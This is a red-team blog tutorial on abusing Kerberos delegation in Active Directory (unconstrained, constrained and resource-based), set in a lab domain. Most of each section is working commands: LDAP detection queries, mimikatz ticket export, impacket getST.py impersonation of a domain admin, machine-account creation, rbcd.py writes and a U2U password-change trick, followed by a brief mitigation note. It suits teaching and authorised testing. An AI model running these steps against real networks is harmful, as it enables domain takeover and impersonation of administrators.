---
layout: post2
language: en
title: "Kerberos: Delegations"
categories: en Kerberos Delegations
tags: ["Red Team", "AD", " Delegations]
---

## Index
---
1. [Unconstrained delegation](#unconstrained-delegation)
	1. [How to detect the feature Unconstrained Delegation](#how-detect-the-feature-unconstrained-delegation)
	2. [How to abuse Unconstrained Delegation](#how-to-abuse-unconstrained-delegation)
2. [Constrained delegation](#constrained-delegation)
	1. [How to detect constrained delegation](#how-to-detect-constrained-delegation)
	2. [How to abuse Constrained Delegation](#how-to-abuse-constrained-delegation)
3. [Resource-based constrained delegations (RBCD)](#resource-based-constrained-delegation)
	1. [How to detect resource base constrained delegation](#how-to-detect-the-feature-rbcd)
	3. [How to abuse RBCD with permission to create machines accounts or with an account with SPN pwned](#how-to-abuse-rbcd-with-permission-to-create-machine-accounts)
	4. [How to abuse RBCD without SPN account or permission to create machine account](#how-to-abuse-rbcd-without-spn-neither-permission-to-create-machine-accounts)
4. [Possible mitigation](#possible-mitigation)

---

# Kerberos: Delegations

Delegations are a windows feature  in a active directory enviroments, the function that them have is that an a service can do actions as specific user, who must ve authenticate before, for example: if we have a Web server with *Kerberos authentication*, and the web can upload file to a file server, the user can make login only in the web service and this service do user impersonation to upload the file in the file server as the user, in this way the user have permission for the file, this is possible because windows delegations.

 
<p align="center">
   <img src="/assets/img/delegacion.png">
</p>

A wrong config of this feature could do that an user can do acctions as other users without the consents of those users. There are three kind of abuse, **Unconstrained delegation**, **Constrained delegation**, **Resource- base constrained delegation(RBCD)**

<br>

---

## Unconstrained delegation

In this case the delegation allow that one user can impersonate any user who did login in the machine with the service, its possible because, in this case, when an user do the authentication the TGT is store, with this TGT the services can generate a TGS for the service that they need. Then if an attacker could get these TGT could generate the TGS that he want. if get the administrator TGT could do a *DCsync*.

This is because the device has enable the attribute *SeEnableDelegation*, this is posible if you check the option *Trust on this equipment for delegation to any service (Kerberos only)*.

<p align="center">
   <img src="/assets/img/SeEnableDelegation.png">
</p>


This modify tge  *userAccountControl* and add the options *TrustedForDelegation*, this allow get advantage if this delegation

<p align="center">
   <img src="/assets/img/TrustedForDelegation.png">
</p>


### How detect the feature Unconstrained Delegation

To detect the feature you can use *ldapsearch*, you should  do a computer filter and search for 524288 value in the *userAccountControl*, an a example request could be.

```ladpsearch
ldapsearch -v -x -D "User@brain.body" -w contraseña -b "DC=brain,DC=body" -H "ldap://dc01.brain.body" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
```

The result would be a list with all the machines accounts with this feature enable.


<p align="center">
   <img src="/assets/img/Uncosldapsearch.png">
</p>

Impacket has the `findDelegation` script, this show all the delegations in the domain, only that you need is a valid credentials.

<p align="center">
   <img src="/assets/img/uncdimpa.png">
</p>


### How to abuse Unconstrained Delegation
  
In our case, we could see the machine `WINDOWS10`, its has `userAccounControl` attribute with the value `524288` as I wrote before with the `ldapsearch` command.

To exploit I will use an user, who i have the credentials, and has a low privilege rights, its called `retard`
<p align="center">
   <img src="/assets/img/userlp.png">
</p>

I will user  [mimikat](https://github.com/gentilkiwi/mimikatz) to take advantega of this feature. Mimikats is a software to, in this case, list all the TGT in the machine, and as this machine has Unconstrained delegation it will have all the TGT of the users did login before.

To dump the tickets in the machine i used `mimikatz.exe "privielge::debug" "sekurlsa::ticekts /export" "exit"`  this give al TGT in a file, then i took the admin TGT and I used with impacket in my machine.

<br>
<p align="center">
   <img src="/assets/img/mimiadmins.png">
</p>
`acapaz` is a domain admin  from `brain.body`
<br>
<p align="center">
   <img src="/assets/img/acapaz.png">
</p>

WIth the acapaz's TGT i could do actions as a domain admin, i use mimikat to export the TGT `kerberos::ppt` 
<br>
<p align="center">
   <img src="/assets/img/tgtacapaz.png">
</p>

Now, with the acapaz's ticket exported, i could do actions over de `domain controller` has the ip adddress `10.10.10.33` 
<br>
<p align="center">
   <img src="/assets/img/dcdir.png">
</p>

## Constrained delegation

This delegation need an user account or machine account pwned, and with a Service Principal Named (SPN) configured, also need the `UserAccountControl`  attribute with `TRUSTED_TO_AUTH-FOR_DELEGATION` value, in the `mds-allowedtodelegatoto` parameter should appear the machine name with delegation option enable.

Also it's necessary an account with the option `trust on this equipment for delegation only to specified services`, depending on the services you have delegated, different actions could be performed.

In this list you can see some actions you could do with specifics permissions:

- cifs: Allow do smb connections, and screctdump attack
- ldap: You allow do a ldaps query and do active directory modifications,as the attribute `msds-Credential-Links`
- http: Allow do http connections

Now we can impersonate any user, including administrators, in the *vulnerable* machine.

### How to detect constrained delegation

To detect this feature enable i used `ldapsearch`, the first that we need is know if the user who we have pwned, has SPN, for that we can use this query:

```ladpsearch
`ldapsearch -v -x -D "User@brain.body" -w contraseña -b "DC=brain,DC=body" -H "ldap://dc01.brain.body" "(&(objectCategory=user) (sAMAccountName=constraineduseser))"
```

Without SPN
<p align="center">
   <img src="/assets/img/userconst.png">         
</p>


With SPN
<p align="center">


   <img src="/assets/img/userconstconf.png">
</p>

After that I filtered for accounts with `msds-allowedtodelegateto` enable, i used this ldapsearch query, return our user with SPN who i sed to do the delegation

```ladpsearch
ldapsearch -v -x -D "User@brain.body" -w contraseña -b "DC=brain,DC=body" -H "ldap://dc01.brain.body" "(&(objectCategory=computer)(msds-allowedtodelegateto=*))"
```

<p align="center">
   <img src="/assets/img/constrainmachine.png">
</p>

  
### How to abuse Constrained Delegation
  
In this case, i see the machine `WINDOWS10`, has the attribute `msds-allowedtodelegateto` with the value `cifs/brain.body` and the user `constraineduseser` with  `msDS-AllowedToDelegateTo` attribute to the *Windows10 cifs* service, as i wrote before with the `ldapsearch` command.

For abuse this i will use `impacket`, and the script `getST.py`, this tool i will use to generate a TGS with user impersonate, i will impersonate the `administrador` for *cifs service* in de machine `Windows10`

```command
getST.py -spn cifs/Windows10.brain.body -impersonate administrador brain.body/constraineduseser:Marzo,24
```
<br>
After that,  I only use the ticket to use the service as `administrator` in `Windows10` m achine 

```command
export KRB5CCNAME=$HOME/administrador.ccache
smbclient.py -k -no-pass windows10.brain.body
use C$
```

<p align="center">
   <img src="/assets/img/ConstrainedDelegation.png">
</p>
<br>
If we could delegate this account, if has `The account is sensitive and cannot be delegated` enable, appear this error.

<p align="center">
   <img src="/assets/img/delegationnotallowed.png">
</p>
<br>
With a ldap query, you can check if you can use the account for delegations, you only need check the `UserAccountControl`, if the attribute has the value`1048576` it's not possible, here a ldapsearch query example:

```ladpsearch
ldapsearch -v -x -D "User@brain.body" -w contraseña -b "DC=brain,DC=body" -H "ldap://dc01.brain.body" "(&(objectCategory=user)(useraccountcontrol:1.2.840.113556.1.4.803:=1048576))"
```


## Resource based constrained delegation 

For this case is necessary an account with write permission on a machine account, could be `Generic Write` permission.
With this permission is possible modify the machine attribute `msDS-AllowedToActOnBehalfOfOtherIdentity` and we can use this to impersonate any user in the machine.

### How to detect the feature RBCD
WIth `pywerview` we can do a query to get the domain acls for a specific object:

`pywerview get-objectacl -u usuario_pwned -w dominio.local -t dc01.dominio.local --resolve-sids --resolve-guids --name objeto_del_ad`
<p align="center">
   <img src="/assets/img/Genericwrite.png">
</p>
Wit this we can see two users with a write permission over *Windows10* machine account, any account have SPN,as you can see with the command:

`ldapsearch -v -x -D "usuario@dominio.local" -w Contraseña -b "DC=dominio,DC=local" -H "ldap://dc01.dominio.local" "(&(objectCategory=user)(ServicePrincipalName=*)) | grep sAMAccountName"`

<p align="center">
   <img src="/assets/img/SPNs.png">
</p>

As we have not account with SPN pwned, we have two possibilities to exploit this problem. For the first one we need permission to create machines accounts and the second one we can use any account but we have to change the password and use pass the hash.

### How to abuse RBCD with permission to create machine accounts

Our user has permission to create machines, the first thing that we have to do is create a machine account, we can user the impacket script `addcompute.py`.

`addcomputer.py -computer-name 'testrbcd' -computer-pass RBCDrules -dc-ip dc01.brain.body brain.body/retard`
<p align="center">
   <img src="/assets/img/addmachine.png">
</p>

After that we add this new account to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute  for the  *Windows10* machine. We can use the `rbcd.py`  *impacket* script:

`rbcd.py -delegate-to 'WINDOWS10$' -action 'write' -delegate-from 'testrbcd$' -dc-ip dc01.brain.body brain.body/retard`
<p align="center">
   <img src="/assets/img/rbcd.png">
</p>

The next step is create a ticket with the machine account which we create before, we que create the ticket we have to impersonate the user who we want, for example a domain admin, with this we could access to the *Windows10* machine.

`getST.py -spn cifs/Windows10.brain.body -impersonate acapaz -dc-ip dc01.brain.body brain.body/testrbcd$`

<p align="center">
   <img src="/assets/img/impersonar.png">
</p>
After that we only have to export the ccache ticket and use to access in the *Windows10* machine:

`export KRB5CCNAME=$(pwd)/acapaz@cifs_Windows10.brain.body@BRAIN.BODY.ccache`

<p align="center">
   <img src="/assets/img/exportarticket.png">
</p>


**Important** 
In the stept where we create the TGS, is very important add the FQDN complete in the machine, if you don't add  you could create a TGS but you can use because the service doesn't exist.
<br><span style="color:red;">cifs/Windows10</span><br>
<span style="color:green;">cifs/Windows10.brain.body</span>



### How to abuse RBCD without SPN neither permission to create machine accounts

For this case, we suppose that we haven't permission for create machine accounts or an account with SPN, we only have the account, *userrbcd*, which have `Generic Write` over *Windows10* machine.
<p align="center">
   <img src="/assets/img/Permiso.png">
</p>

If we try create a machine account, received an error

<p align="center">
   <img src="/assets/img/sinpermiso.png">
</p>

Then we have to modify the attribute `AllowedToActOnBehalfOfOtherIdentity` as appear in this [link](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)

<b>You have to know that in this case we must change the user password and use the pass the hash technique</b>

 We have to change the user password for the RC4 hash, *Ticketsession key* which appear in user TGT, we have to use modify impacket from here:<br>
`https://github.com/SecureAuthCorp/impacket`

The first things that we have to do is, chante the value from the *AllowedToActOnBehalfOfOtherIdentity*  attribute, we have to put the user that we use later to change the password, we need his/her password.

`rbcd.py -delegate-to 'Windows10$' -action 'write' -delegate-from 'userrbcd' -dc-ip dc01.brain.body brain.body/userrbcd`
<p align="center">
   <img src="/assets/img/nospnrbcd.png">
</p>
After that we create a RBCD user TGT, in our example `userrbcd`, who we have the password. 
We can convert the password in a hash with and then we could do *pass the hash*
<br>
`pypykatz crypto nt 'Contraseña'`
`getTGT.py -hashes :HASH_DELCOMANDO_ANTERIOR brain.body/userrbcd`
<p align="center">
   <img src="/assets/img/PTH1.png">
</p>

Then with *describeticket.py* we can get the RC4 hash from the TGT, rember that is the *Ticket session key*
<br>
`describeTicket.py userrbcd.ccache`

<p align="center">
   <img src="/assets/img/describe.png">
</p>


We use this hash as password, then we have to change the password for the user who we will use to impersonate, in our case i use the same user `userrbcd`,  from here we don't know the clear password and we will use pass the hash.

`smbpasswd.py -newhashes :d3c298be6a1c28214c10f89d50b30e8a brain.body/userrbcd@dc01.brain.body`
<p align="center">
   <img src="/assets/img/changepass1.png">
</p>


With the new password added to our user, de DC can decrypt the ticket and use U2U to impersonate a user in the machine which we modify the attribute *AllowedToActOnBehalfOfOtherIdentity*
<br>
`export KRB5CCNAME=userrbcd.ccache`

Now we create a TGS for a DA as a normal RBCD.<br>
`getST.py -u2u -impersonate acapaz -spn "cifs/windows10.brain.body" -k -no-pass brain.body/userrbcd`

With this new ticket, we could access to the machine as `acapaz`, domaind admin
<p align="center">
   <img src="/assets/img/exito.png">
</p>


We could change again the password and put the first one, if they allow repit lasts passowrds
<p align="center">
   <img src="/assets/img/passrestore.png">
</p>


## Possible mitigation

This prbolem is a Windows Feature, then  you have to check the permissions, to be sure that only have this kind of delegation in the correct account, and remove the delegations always that it be possible.

For deny delegate to importan users, as administrators, you can configurare the importan accounts checking the box  `The account is sensitive and cannot be delegated.`

<p align="center">
   <img src="/assets/img/importante.png">
</p>



---

<br>
## References
- *https://attl4s.github.io/assets/pdf/You_do_(not)_Understand_Kerberos_Delegation.pdf*a
- *https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation*
- *https://www.tarlogic.com/blog/kerberos-iii-how-does-delegation-work/*
- https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd
- https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html
- https://github.com/ShutdownRepo/impacket/tree/getST-u2u
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution
 


## Thanks
- [Mario Bartolome](https://github.com/MarioBartolome) - *For tireless help and inspiration_* 
- [Raul Redondo](https://rayrt.gitlab.io/) - *His help solved my agony with the FQDN in the services to generate the TGS*
